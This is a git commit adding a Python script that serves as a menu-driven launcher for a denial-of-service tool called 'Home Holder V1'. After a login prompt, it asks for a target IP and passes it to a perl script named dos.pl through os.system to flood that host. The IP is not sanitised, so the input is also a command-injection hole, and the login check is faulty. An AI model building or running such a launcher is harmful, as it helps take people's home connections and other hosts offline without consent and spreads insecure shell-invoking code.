5873b4eace50a3bb32799b39498c953234dc955e
wouterton <126216067+wouterton@users.noreply.github.com>
2023-02-25 18:49:55 +0100

    Create main.py

---
+++ main.py
@@ -0,0 +1,72 @@
+import os, colorama, requests, time
+from colorama import Fore, init
+
+import sys
+
+sys.stdout.write("\x1b]2;General Home V1 Home Holder!\x07")
+
+banner = f"""
+██╗  ██╗ ██████╗ ███╗   ███╗███████╗    ██╗   ██╗ ██╗
+██║  ██║██╔═══██╗████╗ ████║██╔════╝    ██║   ██║███║
+███████║██║   ██║██╔████╔██║█████╗      ██║   ██║╚██║
+██╔══██║██║   ██║██║╚██╔╝██║██╔══╝      ╚██╗ ██╔╝ ██║
+██║  ██║╚██████╔╝██║ ╚═╝ ██║███████╗     ╚████╔╝  ██║
+╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝      ╚═══╝   ╚═╝
+ ╔══════════════════════════════════════════════════╦ 
+ ║   Welcome To Home V1 this is a home-holder       ║
+ ║   ============================================   ║
+ ║   Please type 'Methods' to see our methods       ║
+ ╚══════════════════════════════════════════════════╝
+
+"""
+
+methods = f"""
+██╗  ██╗ ██████╗ ███╗   ███╗███████╗    ██╗   ██╗ ██╗
+██║  ██║██╔═══██╗████╗ ████║██╔════╝    ██║   ██║███║
+███████║██║   ██║██╔████╔██║█████╗      ██║   ██║╚██║
+██╔══██║██║   ██║██║╚██╔╝██║██╔══╝      ╚██╗ ██╔╝ ██║
+██║  ██║╚██████╔╝██║ ╚═╝ ██║███████╗     ╚████╔╝  ██║
+╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝      ╚═══╝   ╚═╝
+ ╔════════════════════════════════════════════╦ 
+ ║   Home Holder V1 - Home-Hold methods!      ║
+ ║   ======================================   ║
+ ║             Home-Hold                      ║
+ ╚════════════════════════════════════════════╝
+"""
+
+
+def login():
+  user = input(f'{Fore.LIGHTRED_EX}User: ')
+  password = input(f'{Fore.LIGHTRED_EX}Pass: ')
+  f = open('users/users.txt', 'r')
+  check = f.read()
+  if user and password in check:
+    main()
+  else:
+    print('Invalid User & password!')
+
+
+def main():
+  os.system('clear')
+  print(banner)
+
+  choice = input(f'{Fore.CYAN}[home@guest]$ ')
+  if choice == "Methods":
+    os.system('clear')
+    print(methods)
+    time.sleep(3.4)
+    os.system('clear')
+    main()
+
+  if choice == "homehold":
+    os.system('clear')
+    print(banner)
+    ip = input(f'{Fore.RED} ip:')
+    os.system(f'perl methods/dos.pl {ip}')
+    main()
+  else:
+    os.system('clear')
+    main()
+
+
+login()
